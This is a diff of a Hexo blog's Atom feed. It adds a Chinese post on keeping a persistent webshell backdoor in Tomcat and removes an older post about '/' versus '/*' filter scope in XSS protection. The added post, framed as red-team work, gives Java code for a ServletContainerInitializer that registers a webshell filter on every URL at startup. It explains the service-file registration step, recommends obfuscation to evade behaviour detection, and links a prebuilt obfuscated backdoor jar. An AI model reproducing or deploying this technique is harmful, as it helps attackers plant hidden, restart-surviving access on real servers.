@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://gv7.me/"/>
-  <updated>2020-10-13T13:36:47.194Z</updated>
+  <updated>2021-04-23T10:29:16.515Z</updated>
   <id>http://gv7.me/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>一种tomcat中间件留持久化后门的思路</title>
+    <link href="http://gv7.me/articles/2021/an-idea-of-keeping-persistent-backdoor-in-tomcat-middleware/"/>
+    <id>http://gv7.me/articles/2021/an-idea-of-keeping-persistent-backdoor-in-tomcat-middleware/</id>
+    <published>2021-04-02T04:19:19.000Z</published>
+    <updated>2021-04-23T10:29:16.515Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>在红队行动中，内存马虽然好用，但是它存在的最大的问题是重启之后就失效了。这时候留持久化后门就是一个刚需了。今天简单分享一个Tomcat中间件的思路。</p><h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p>相信通过<code>@Filter/@Servlet</code>标签来实现Tomcat后门的想法已经被用烂了，这里分享一个比较冷门的接口<code>ServletContainerInitializer</code>。它是<code>Servlet 3.0</code>新增的一个接口，主要用于在容器启动阶段通过编程风格注册web三大组件<code>Filter</code>, <code>Servlet</code>以及<code>Listener</code>，以取代通过web.xml配置注册，减少了对配置的依赖。我们可以用这样的机制来注册一个实现了webshell功能的组件，下面以注册Filter</p><h2 id="0x03-实现"><a href="#0x03-实现" class="headerlink" title="0x03 实现"></a>0x03 实现</h2><p>首先我们编写一个class实现<code>ServletContainerInitializer</code>接口，其中<code>onStartup</code>方法会在Tomcat中间件重启加载当前webapp会优先执行这个方法。通过改方法，我们可以注册一个webshell的filter。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.HandlesTypes;</span><br><span class="line"><span class="keyword">import</span> java.util.EnumSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="meta">@HandlesTypes</span>(&#123;MainFilter.class&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainFilterInitializer</span> <span class="keyword">implements</span> <span class="title">ServletContainerInitializer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartup</span><span class="params">(Set&lt;Class&lt;?&gt;&gt; set, ServletContext servletContext)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        <span class="comment">// 将webshell filter注册到上下文当中</span></span><br><span class="line">        FilterRegistration.Dynamic filter = servletContext.addFilter(MainFilter.class.getSimpleName(), MainFilter.class);</span><br><span class="line">        EnumSet&lt;DispatcherType&gt; dispatcherTypes = EnumSet.allOf(DispatcherType.class);</span><br><span class="line">        dispatcherTypes.add(DispatcherType.REQUEST);</span><br><span class="line">        dispatcherTypes.add(DispatcherType.FORWARD);</span><br><span class="line">        <span class="comment">// 设置webshell filter的访问路径</span></span><br><span class="line">        filter.addMappingForUrlPatterns(dispatcherTypes, <span class="keyword">true</span>, <span class="string">"/*"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后在打包jar之前创建一个文件<code>META-INF/services/javax.servlet.ServletContainerInitializer</code>，并填写以上class名即可。</p><p>为了兼容性我们最好使用jdk1.5进行编译，同时为了防止被行为分析我们最好对代码进行混淆。</p><p>最后分享给大家一个我自己做好的一个后门给大家做一个参考。</p><p><a href="tomcat-lib-backdoor-obfuscated.jar">下载地址</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;0x01-背景&quot;&gt;&lt;a href=&quot;#0x01-背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 背景&quot;&gt;&lt;/a&gt;0x01 背景&lt;/h2&gt;&lt;p&gt;在红队行动中，内存马虽然好用，但是它存在的最大的问题是重启之后就失效了。这时候留持久化后门就是一个刚
+      
+    
+    </summary>
+    
+    
+      <category term="后门" scheme="http://gv7.me/tags/%E5%90%8E%E9%97%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Filter/Servlet型内存马的扫描抓捕与查杀</title>
@@ -457,31 +480,6 @@
     </summary>
     
       <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>过滤器作用范围/和/*引发的安全问题</title>
-    <link href="http://gv7.me/articles/2019/security-raised-by-java-filter-scope-missetting/"/>
-    <id>http://gv7.me/articles/2019/security-raised-by-java-filter-scope-missetting/</id>
-    <published>2019-04-04T19:10:20.000Z</published>
-    <updated>2019-04-04T20:41:08.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>问题：过滤器作用范围设置为/或/*一样么？</strong></p><p>安全人员可能觉得不一样，毕竟从对通配符的认识来说，<code>/</code>代表的只是根目录，<code>/*</code>代表所有。</p><p>开发人员可能觉得一样，根据平常的开发经验，并未发现两者的差别。</p><p>其实呢，这两种认识都不正确，更确切地说前者说的不够正确。具体许我慢慢道来。</p><h2 id="0x01-问题背景"><a href="#0x01-问题背景" class="headerlink" title="0x01 问题背景"></a>0x01 问题背景</h2><p>回想起之前做的代码审计时，发现项目设置全局过滤器时，有的设置为<code>/</code>，有的设置为<code>/*</code>。<br>在自己模糊印象里，在校学jsp时确实感觉两者是一样的。但作为安全人员，还是不禁好奇，于是查资料写代码实验，终于发现他们的不同。在我明白了它们的不同之后，我调查了下周边做安全和开发的朋友，结果清一色的认为它们一样。</p><h2 id="0x02-实验测试"><a href="#0x02-实验测试" class="headerlink" title="0x02 实验测试"></a>0x02 实验测试</h2><p>我们以防御XSS漏洞的demo来实验，过滤器使用上篇文章的代码。</p><p><strong>存在XSS漏洞的jsp页面代码</strong></p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% out.write(request.getParameter(<span class="string">"str"</span>));%&gt;</span><br></pre></td></tr></table></figure><p><strong>web.xml中过滤器配置</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>me.gv7.filter.XssFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CrossSiteScriptFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;url-pattern&gt;/*&lt;/url-pattern&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/security-raised-by-java-filter-scope-missetting/show.gif" alt="演示"></p><p>通过演示的结果我们知道：</p><ol><li><code>/*</code>才是真正意义上的过滤所有请求</li><li><code>/</code>并非真正意义上的过滤所有请求，它过滤除jsp页面之外的请求</li></ol><h2 id="0x03-最后总结"><a href="#0x03-最后总结" class="headerlink" title="0x03 最后总结"></a>0x03 最后总结</h2><p>一般项目采用MVC架构之后，基本不会有程序猿继续在jsp文件写后端处理代码。然而这个世界很奇怪，正如墨菲定律说的那样，觉得不可能的往往会发生。而我们更不能把安全寄托于人性上，所以全局安全过滤器请设置作用范围为<code>/*</code>。</p><p>当我们在进行代码审计发现全局过滤器的作用范围为<code>/</code>,则可以着重检查jsp文件中是否包含后端处理代码，毕竟其不在过滤器保护范围内。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;strong&gt;问题：过滤器作用范围设置为/或/*一样么？&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;安全人员可能觉得不一样，毕竟从对通配符的认识来说，&lt;code&gt;/&lt;/code&gt;代表的只是根目录，&lt;code&gt;/*&lt;/code&gt;代表所有。&lt;/p&gt;
-&lt;p&gt;开发人员可能觉得一样，根据平常
-      
-    
-    </summary>
-    
-      <category term="代码审计" scheme="http://gv7.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
     
   </entry>
